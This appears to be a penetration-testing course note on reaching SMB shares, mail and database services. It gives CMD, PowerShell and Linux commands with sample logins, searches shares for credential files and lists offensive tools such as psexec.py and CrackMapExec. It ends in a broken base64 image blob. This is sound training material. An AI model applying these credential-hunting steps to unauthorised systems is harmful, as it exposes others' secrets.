---
{"dg-publish":true,"permalink":"/cybersecurity/penetration-tester/attacking-common-services/"}
---


# Interacting with Common Services

## File Share Services

Internal services include things like:

- SMB
- NFS
- FTP
- TFTP
- SFTP

Now things ilke:
- Dropbox
- Google Drive
- Onedrive
- Sharepoint
- AWS S3
- Azure Blob Storage
- Google Cloud Storage

## Server Message Block (SMB)

Common on Windows Network. GUI we can hit `[WINKEY] + [R]` then enter the file share location something like: `\\192.168.220.129\Finance\`  Windows will logus in if anonymous auth is allowed or if the user has privilege.  Otherwise we'll get an auth request.

### Windows CMD - DIR

- `dir` command will let us see the contents of a director

### Windows CMD - Net Use
- `net use` connects a computer to or disconnects a computer to the share resource.  We have to set a drive so something like:
```cmd-session
C:\> net use n: \\192.168.220.129\Finance

The command completed successfully.
```

To use creds:

```cmd-session
C:\> net use n: \\192.168.220.129\Finance /user:plaintext Password123

The command completed successfully.
```

Now we can see how many files:

```cmd-session
C:\> dir n: /a-d /s /b | find /c ":\"

29302
```

[Dir instructions from microsoft](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/dir).

<table class="table table-striped text-left">
<thead>
<tr>
<th><strong>Syntax</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>dir</code></td>
<td>Application</td>
</tr>
<tr>
<td><code>n:</code></td>
<td>Directory or drive to search</td>
</tr>
<tr>
<td><code>/a-d</code></td>
<td><code>/a</code> is the attribute and <code>-d</code> means not directories</td>
</tr>
<tr>
<td><code>/s</code></td>
<td>Displays files in a specified directory and all subdirectories</td>
</tr>
<tr>
<td><code>/b</code></td>
<td>Uses bare format (no heading information or summary)</td>
</tr>
</tbody>
</table>

The output of the `dir` command is then piped to `find` and the parameter `/c` is used to count the lines that have the indicated string `:\`

We can use wild cards for the `dir` command:

```cmd-session
C:\>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt


C:\>dir n:\*secret* /s /b

n:\Contracts\private\secret.txt
```

The  `/s` paramater tells windows to search in the current directory and all subdirectories.

### Windows CMD - Findstr

```cmd-session
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

We can find more `findstr` examples [here](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr#examples).

### Windows PowerShell

Meant to extend the capabilities of the command shell. Uses `cmdlets`. Which are like Windows commands but have a more extensible scripting language.

Powershell can run windows commands amd cmdlets, but Command shell can only run Windows commands.

Directory contents of an SMB:
```powershell-session
PS C:\> Get-ChildItem \\192.168.220.129\Finance\

    Directory: \\192.168.220.129\Finance

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2/23/2022   3:27 PM                Contracts
```

Mount the drive:

```powershell-session
PS C:\> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```

Windows PowerShell - PSCredential Object

```powershell-session
PS C:\> $username = 'plaintext'
PS C:\> $password = 'Password123'
PS C:\> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
----           ---------     --------- --------      ----                                                              ---------------
N                                      FileSystem    \\192.168.220.129\Finance
```

```powershell-session
PS C:\> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count

29302
```

```powershell-session
PS C:\> Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

    Directory: N:\Contracts\private

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         2/23/2022   4:36 PM             25 credentials.txt
```

```powershell-session
PS C:\> Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List

N:\Contracts\private\secret.txt:1:file with all credentials
N:\Contracts\private\credentials.txt:1:admin:SecureCredentials!
```

### Linux

#### Linux - Mount

```bash
$ sudo mkdir /mnt/Finance
$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

We can also setup the creds in a file:
```txt
username=plaintext
password=Password123
domain=.
```

And then mount: 
```
$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

Note: We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

## Email

We typically need two protocols to send and receive messages, one for sending and another for receiving. The Simple Mail Transfer Protocol (SMTP) is an email delivery protocol used to send mail over the internet. Likewise, a supporting protocol must be used to retrieve an email from a service. There are two main protocols we can use POP3 and IMAP.

You can setup and connect with a mail client.

## Databases

Different types include hierarchical, NoSQL (non-relational), SQL (relational). Focusing on [[Cybersecurity/Bug Bounty Hunter/SQL Injection/MySQL\|MySQL]] and [[Cybersecurity/Penetration Tester/MSSQL\|MSSQL]]. We interact with the database through:
1. Command line utilities (`mysql` or `sqsh`)
2. A gui: HeidiSQL, MySQL Workbench, or SQL Server Management Studio.
3. Programming Language

### Command Line Utilities

To interact with [MSSQL (Microsoft SQL Server)](https://www.microsoft.com/en-us/sql-server/sql-server-downloads) with Linux we can use [sqsh](https://en.wikipedia.org/wiki/Sqsh) or [sqlcmd](https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility) if you are using Windows.

```
$ sqsh -S 10.129.20.13 -U username -P Password123
```

```cmd-session
C:\> sqlcmd -S 10.129.20.13 -U username -P Password123
```

To interact with SQL, use mysql:
```shell-session
$ mysql -u username -pPassword123 -h 10.129.20.13
```

```cmd-session
C:\> mysql.exe -u username -pPassword123 -h 10.129.20.13
```

### GUI Application

Database engines commonly have their own GUI application. MySQL has [MySQL Workbench](https://dev.mysql.com/downloads/workbench/) and MSSQL has [SQL Server Management Studio or SSMS](https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms), we can install those tools in our attack host and connect to the database. SSMS is only supported in Windows. An alternative is to use community tools such as [dbeaver](https://github.com/dbeaver/dbeaver). [dbeaver](https://github.com/dbeaver/dbeaver) is a multi-platform database tool for Linux, macOS, and Windows that supports connecting to multiple database engines such as MSSQL, MySQL, PostgreSQL, among others, making it easy for us, as an attacker, to interact with common database servers.

<h4>Tools to Interact with Common Services</h4>
<div class="table-responsive"><table class="table table-striped text-left">
<thead>
<tr>
<th><strong>SMB</strong></th>
<th><strong>FTP</strong></th>
<th><strong>Email</strong></th>
<th><strong>Databases</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html" target="_blank" rel="noopener nofollow">smbclient</a></td>
<td><a href="https://linux.die.net/man/1/ftp" target="_blank" rel="noopener nofollow">ftp</a></td>
<td><a href="https://www.thunderbird.net/en-US/" target="_blank" rel="noopener nofollow">Thunderbird</a></td>
<td><a href="https://github.com/dbcli/mssql-cli" target="_blank" rel="noopener nofollow">mssql-cli</a></td>
</tr>
<tr>
<td><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener nofollow">CrackMapExec</a></td>
<td><a href="https://lftp.yar.ru/" target="_blank" rel="noopener nofollow">lftp</a></td>
<td><a href="https://www.claws-mail.org/" target="_blank" rel="noopener nofollow">Claws</a></td>
<td><a href="https://github.com/dbcli/mycli" target="_blank" rel="noopener nofollow">mycli</a></td>
</tr>
<tr>
<td><a href="https://github.com/ShawnDEvans/smbmap" target="_blank" rel="noopener nofollow">SMBMap</a></td>
<td><a href="https://www.ncftp.com/" target="_blank" rel="noopener nofollow">ncftp</a></td>
<td><a href="https://wiki.gnome.org/Apps/Geary" target="_blank" rel="noopener nofollow">Geary</a></td>
<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py" target="_blank" rel="noopener nofollow">mssqlclient.py</a></td>
</tr>
<tr>
<td><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener nofollow">Impacket</a></td>
<td><a href="https://filezilla-project.org/" target="_blank" rel="noopener nofollow">filezilla</a></td>
<td><a href="https://getmailspring.com" target="_blank" rel="noopener nofollow">MailSpring</a></td>
<td><a href="https://github.com/dbeaver/dbeaver" target="_blank" rel="noopener nofollow">dbeaver</a></td>
</tr>
<tr>
<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py" target="_blank" rel="noopener nofollow">psexec.py</a></td>
<td><a href="http://www.crossftp.com/" target="_blank" rel="noopener nofollow">crossftp</a></td>
<td><a href="http://www.mutt.org/" target="_blank" rel="noopener nofollow">mutt</a></td>
<td><a href="https://dev.mysql.com/downloads/workbench/" target="_blank" rel="noopener nofollow">MySQL Workbench</a></td>
</tr>
<tr>
<td><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py" target="_blank" rel="noopener nofollow">smbexec.py</a></td>
<td></td>
<td><a href="https://mailutils.org/" target="_blank" rel="noopener nofollow">mailutils</a></td>
<td><a href="https://docs.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms" target="_blank" rel="noopener nofollow">SQL Server Management Studio or SSMS</a></td>
</tr>
<tr>
<td></td>
<td></td>
<td><a href="https://github.com/mogaal/sendemail" target="_blank" rel="noopener nofollow">sendEmail</a></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td><a href="http://www.jetmore.org/john/code/swaks/" target="_blank" rel="noopener nofollow">swaks</a></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td><a href="https://en.wikipedia.org/wiki/Sendmail" target="_blank" rel="noopener nofollow">sendmail</a></td>
<td></td>
</tr>
</tbody>
</table></div>

## General Troubleshooting

Depending on the Windows or Linux version we are working with or targetting, we may encounter different problems when attempting to connect to a service.

Some reasons why we may not have access to a resource:

-   Authentication
-   Privileges
-   Network Connection
-   Firewall Rules
-   Protocol Support

Keep in mind that we may encounter different errors depending on the service we are targetting. We can use the error codes to our advantage and search for official documentation or forums where people solved an issue similar to ours.

# The Concept of Attacks

![Pasted image 20230401054931.png](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAABEkAAAI7CAYAAAAQ38W9AAAABHNCSVQICAgIfAhkiAAAIABJREFUeF7svdmTHFma3fe5R0RuyMS+70ABBdTWtVcvM72wORyOrEnJZDTKjHqg3iQz6Q+QHvmkVz3LTJKZjCaKRiMlUtRQJGemp3t6qe7qKtSKfd/XBBK5L+HuOufzuJGenpGJRAG5RRx3BDLCw8P93p9fd7/3+LdEu4+8k0VRZGmaWpLUTZMIiIAIiIAIiIAIiIAIiIAIiIAIiIAIdA6ByGq1mlc3pkDCl1nWOfVXTUVABERABERABERABERABERABERABETACeR6CLWRWEREQAREQAREQAREQAREQAREQAREQAREQARgSSIIIiACIiACIiACIiACIiACIiACIiACIiACEknUBkRABERABERABERABERABERABERABETACciSRA1BBERABERABERABERABERABERABERABEBAIomagQiIgAiIgAiIgAiIgAiIgAiIgAiIgAiAgEQSNQMREAEREAEREAEREAEREAEREAEREAERAAGJJGoGIiACIiACIiACIiACIiACIiACIiACIgACEknUDERABERABERABERABERABERABERABEQABCSSqBmIgAiIgAiIgAiIgAiIgAiIgAiIgAiIAAhIJFEzEAEREAEREAEREAEREAEREAEREAEREAEQkEiiZiACIiACIiACIiACIiACIiACIiACIiACICCRRM1ABERABERABERABERABERABERABERABEBAIomagQiIgAiIgAiIgAiIgAiIgAiIgAiIgAiAgEQSNQMREAEREAEREAEREAEREAEREAEREAERAAGJJGoGIiACIiACIiACIiACIiACIiACIiACIgACEknUDERABERABERABERABERABERABERABEQABCSSqBmIgAiIgAiIgAiIgAiIgAiIgAiIgAiIAAhIJFEzEAEREAEREAEREAEREAEREAEREAEREAEQkEiiZiACIiACIiACIiACIiACIiACIiACIiACICCRRM1ABERABERABERABERABERABERABERABEBAIomagQiIgAiIgAiIgAiIgAiIgAiIgAiIgAiAgEQSNQMREAEREAEREAEREAEREAEREAEREAERAAGJJGoGIiACIiACIiACIiACIiACIiACIiACIgACEknUDERABERABERABERABERABERABERABEQABCSSqBmIgAiIgAiIgAiIgAiIgAiIgAiIgAiIAAhIJFEzEAEREAEREAEREAEREAEREAEREAEREAEQkEiiZiACIiACIiACIiACIiACIiACIiACIiACICCRRM1ABERABERABERABERABERABERABERABEBAIomagQiIgAiIgAiIgAiIgAiIgAiIgAiIgAiAgEQSNQMREAEREAEREAEREAEREAEREAEREAERAAGJJGoGIiACIiACIiACIiACIiACIiACIiACIgACEknUDERABERABERABERABERABERABERABEQABCSSqBmIgAiIgAiIgAiIgAiIgAiIgAiIgAiIAAhIJFEzEAEREAEREAEREAEREAEREAEREAEREAEQkEiiZiACIiACIiACIiACIiACIiACIiACIiACICCRRM1ABERABERABERABERABERABERABERABEBAIomagQiIgAiIgAiIgAiIgAiIgAiIgAiIgAiAgEQSNQMREAEREAEREAEREAEREAEREAEREAERAAGJJGoGIiACIiACIiACIiACIiACIiACIiACIgACEknUDERABERABERABERABERABERABERABEQABCSSqBmIgAiIgAiIgAiIgAiIgAiIgAiIgAiIAAhIJFEzEAEREAEREAEREAEREAEREAEREAEREAEQkEiiZiACIiACIiACIiACIiACIiACIiACIiACICCRRM1ABERABERABERABERABERABERABERABEBAIomagQiIgAiIgAiIgAiIgAiIgAiIgAiIgAiAgEQSNQMREAEREAEREAEREAEREAEREAEREAERAAGJJGoGIiACIiACIiACIiACIiACIiACIiACIgACEknUDERABERABERABERABERABERABERABEQABCSSqBmIgAiIgAiIgAiIgAiIgAiIgAiIgAiIAAhIJFEzEAEREAEREAEREAEREAEREAEREAEREAEQkEiiZiACIiACIiACIiACIiACIiACIiACIiACICCRRM1ABERABERABERABERABERABERABERABEBAIomagQiIgAiIgAiIgAiIgAiIgAiIgAiIgAiAgEQSNQMREAEREAEReAECGX6bZfifr8bEz75sCVN53fLnJWxCq4iACIiACIiACIiACLwkAtWX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